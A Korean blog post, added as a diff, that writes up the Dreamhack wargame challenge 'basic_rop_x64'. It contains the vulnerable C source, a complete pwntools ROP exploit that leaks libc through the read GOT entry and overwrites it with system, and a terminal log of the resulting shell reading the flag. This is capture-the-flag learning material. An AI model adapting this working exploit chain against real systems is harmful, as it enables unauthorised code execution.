@@ -1,0 +1,193 @@
+---
+title: "[Dreamhack] basic_rop_x64 문제 풀이"
+date: 2025-01-19
+tags: ["dreamhack", "system_hacking", "wargame"]
+draft: false
+summary: "요약: 저번 익스코드 사골 성공. 근데 거지같은 recvuntil 로 안거르는 바람에 바보짓함 ㅋ"
+---
+
+# 문제 개요
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <unistd.h>
+
+
+void alarm_handler() {
+    puts("TIME OUT");
+    exit(-1);
+}
+
+
+void initialize() {
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+
+    signal(SIGALRM, alarm_handler);
+    alarm(30);
+}
+
+int main(int argc, char *argv[]) {
+    char buf[0x40] = {};
+
+    initialize();
+
+    read(0, buf, 0x400);
+    write(1, buf, sizeof(buf));
+
+    return 0;
+}
+```
+
+코드는 위와 같이 되어있다. ~~역시 Simple Is Best~~
+# 익스플로잇 코드 작성
+
+```python
+from pwn import *
+
+p= remote('host1.dreamhack.games', 9793)
+#p= process('./basic_rop_x64')
+elf = ELF('./basic_rop_x64')
+libc = ELF('./libc.so.6')
+#libc = elf.libc
+bss = 0x601090
+
+binsh = b'/bin/sh\x00'
+p_rdi = 0x0000000000400883
+p_rsi = 0x0000000000400881 # pop rsi ; pop r15 ; ret
+ret = 0x00000000004005a9
+write_plt = elf.plt['write']
+read_plt = elf.plt['read']
+read_got = elf.got['read']
+
+pause()
+
+# chain 0. Buffer Overflowing
+payload = b'A' * 72
+# chain 1. leaking read@got to using write
+payload += p64(p_rdi)
+payload += p64(1)
+payload += p64(p_rsi)
+payload += p64(read_got)
+payload += p64(16)
+payload += p64(write_plt)
+# chain 2. binsh write in bss
+payload += p64(p_rdi) + p64(0)
+payload += p64(p_rsi) + p64(bss) + p64(8)
+payload += p64(read_plt)
+# chain 3. got overwriting
+payload += p64(p_rdi)
+payload += p64(0)
+payload += p64(p_rsi)
+payload += p64(read_got)
+payload += p64(16)
+payload += p64(read_plt)
+# chain 4. return to read_plt (got overwrited)
+payload += p64(ret)
+payload += p64(p_rdi)
+payload += p64(bss)
+payload += p64(read_plt)
+
+p.send(payload)
+
+p.recvuntil(b'A'*64)
+leak = u64(p.recv(6) + b"\x00\x00")
+base = leak - libc.symbols['read']
+sys = base + libc.symbols['system']
+print('read_leak: '+hex(leak))
+print('base: '+hex(base))
+print('system: '+hex(sys))
+print('bss: '+hex(bss))
+
+p.send(b'/bin/sh\x00')
+p.send(p64(sys))
+
+p.interactive()
+```
+
+나는 내 이끌리는대로 코드를 짜는편이라 좀 드럽다. 보는데 지장없으니 이해 부탁한다.
+
+뭐 간단하게 설명하자면,
+- 가젯 찾고,
+- bof나는거 확인하고,
+- 그러고 그냥 어제 쓴 코드 우려먹고
+- recvuntil 안넣은거 넣고 끝남.
+
+오늘은 어제 쓴 코드로 사골좀 우렸다. 같은 함수로 익스플로잇하는 문제라 개꿀이었음 ㅇㅇ
+
+근데 바보짓을 하나 했음. __알아보자__
+
+## 바보짓의 시작
+
+핫, 버퍼 길이정도만 바꾸면 되겠지 하고 바꿨다.
+
+__"어? 왜 안되지?"__ 하면서 문제 코드 다른게 있는지 확인했다.
+
+이런, 모두 같은 함수쓰는 문제가 맞는거 같은데..
+
+맞음 ㅇㅇ
+
+근데 이문제와 어제 문제의 차이점이 1개 존재한다.
+
+## 거지같은 A
+
+이번 문제는 첫 인풋에 걸러야하는 `buf : ` 같은게 존재하지 않아서 그냥 `p.send()` 로 보냈음.
+
+그리고 read leak 한 부분에서 잊어먹고 BOF 할때 보낸 A를 안거르고 보냈음.
+
+망할.
+
+그제서야 깨닫고 `p.recvuntil()` 로 걸렀음. 십 바로 됌. 
+
+> 하여튼 이런 바보짓들을 통해서 한차례 더 앞에 이물질?을 잘 거르자는 마음을 가지게 됌.
+> __본론으로 이제 익스를 해보자.__
+
+# 익스플로잇!!
+
+```bash
+zerocoke@1eeeb91477a2:~/dh/basic_rop_x64$ python3 ex.py
+[+] Opening connection to host1.dreamhack.games on port 9793: Done
+[*] '/home/zerocoke/dh/basic_rop_x64/basic_rop_x64'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+[*] '/home/zerocoke/dh/basic_rop_x64/libc.so.6'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+[*] Paused (press any to continue)
+read_leak: 0x7f5bf0ab0980
+base: 0x7f5bf099c000
+system: 0x7f5bf09ecd60
+bss: 0x601090
+[*] Switching to interactive mode
+\x00\x00\xc0]\x9c\xf0[\x7f\x00\x00 \xe4\x9d\xf0[\x7f\x00\x00p֡\xf0[\x7f\x00\x006\x06@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$                                                                    l                                                                                                                                      ls                                                                                                                                     ls
+basic_rop_x64
+flag
+$ cat flag
+DH{...}
+$ exit
+[*] Got EOF while reading in interactive
+$ 
+$ 
+[*] Closed connection to host1.dreamhack.games port 9793
+[*] Got EOF while sending in interactive
+```
+# 느낀점 또는 발전한 점
+
+게을러진게 느껴져서 오늘 무조건 올린다는 생각으로 풀었음.
+
+한두시간 정도 걸렸음. 이리쉬운걸... 좀 어휴....
+
+하여튼 이젠 `p.recvuntil()` 좀 잘 써야겠음.. 계속 잊어먹음;;;;;
+
+오늘은 사골 코드로 야무지게 꿀빤다 히히히
